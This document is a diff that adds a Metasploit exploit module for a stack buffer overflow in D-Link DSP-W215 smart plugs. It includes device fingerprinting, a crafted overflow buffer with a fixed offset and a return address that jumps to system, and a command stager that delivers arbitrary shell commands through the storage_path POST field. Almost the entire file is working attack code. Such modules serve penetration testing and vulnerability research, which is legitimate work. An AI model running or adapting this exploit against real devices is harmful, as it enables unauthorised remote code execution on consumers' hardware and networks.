@@ -1,0 +1,131 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'D-Link info.cgi POST Request Buffer Overflow',
+      'Description'    => %q{
+        This module exploits an anonymous remote code execution vulnerability on different D-Link
+        devices. The vulnerability is an stack based buffer overflow in the my_cgi.cgi component,
+        when handling specially crafted POST HTTP requests addresses to the /common/info.cgi
+        handler. This module has been successfully tested on D-Link DSP-W215 in an emulated
+        environment.
+      },
+      'Author'         =>
+        [
+          'Craig Heffner',   # vulnerability discovery and initial PoC
+          'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'linux',
+      'Arch'           => ARCH_MIPSBE,
+      'References'     =>
+        [
+          ['OSVDB', '108249'],
+          ['URL', 'http://www.devttys0.com/2014/05/hacking-the-dspw215-again/'] # blog post from Craig including PoC
+        ],
+      'Targets'        =>
+        [
+          #
+          # Automatic targeting via fingerprinting
+          #
+          [ 'Automatic Targeting', { 'auto' => true }  ],
+          [ 'D-Link DSP-W215 - v1.02',
+            {
+              'Offset' => 477472,
+              'Ret'    => 0x405cec # jump to system - my_cgi.cgi
+            }
+          ]
+        ],
+      'DisclosureDate' => 'May 22 2014',
+      'DefaultTarget' => 0))
+
+    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')
+  end
+
+  def check
+    begin
+      res = send_request_cgi({
+        'uri' => "/common/info.cgi",
+        'method'  => 'GET'
+      })
+
+      if res && [200, 301, 302].include?(res.code)
+        if res.body =~ /DSP-W215A1/ && res.body =~ /1.02/
+          @my_target = targets[1] if target['auto']
+          return Exploit::CheckCode::Appears
+        end
+
+        return Exploit::CheckCode::Detected
+      end
+
+    rescue ::Rex::ConnectionError
+      return Exploit::CheckCode::Safe
+    end
+
+    Exploit::CheckCode::Unknown
+  end
+
+  def exploit
+    print_status("#{peer} - Trying to access the vulnerable URL...")
+
+    @my_target = target
+    check_code = check
+
+    unless check_code == Exploit::CheckCode::Detected || check_code == Exploit::CheckCode::Appears
+      fail_with(Failure::NoTarget, "#{peer} - Failed to access the vulnerable URL")
+    end
+
+    if @my_target.nil? || @my_target['auto']
+      fail_with(Failure::NoTarget, "#{peer} - Failed to auto detect, try setting a manual target...")
+    end
+
+    print_status("#{peer} - Exploiting #{@my_target.name}...")
+    execute_cmdstager(
+      :flavor  => :echo,
+      :linemax => 185
+    )
+  end
+
+  def prepare_shellcode(cmd)
+    buf = rand_text_alpha_upper(@my_target['Offset'])   # Stack filler
+    buf << [@my_target.ret].pack("N")                   # Overwrite $ra -> jump to system
+
+           # la $t9, system
+           # la $s1, 0x440000
+           # jalr $t9 ; system
+           # addiu $a0, $sp, 0x28 # our command
+
+    buf << rand_text_alpha_upper(40)                # Command to execute must be at $sp+0x28
+    buf << cmd                                      # Command to execute
+    buf << "\x00"                                   # NULL terminate the command
+  end
+
+  def execute_command(cmd, opts)
+    shellcode = prepare_shellcode(cmd)
+
+    begin
+      res = send_request_cgi({
+        'method'        => 'POST',
+        'uri'           => "/common/info.cgi",
+        'encode_params' => false,
+        'vars_post'     => {
+          'storage_path' => shellcode,
+        }
+      }, 5)
+      return res
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
+    end
+  end
+end
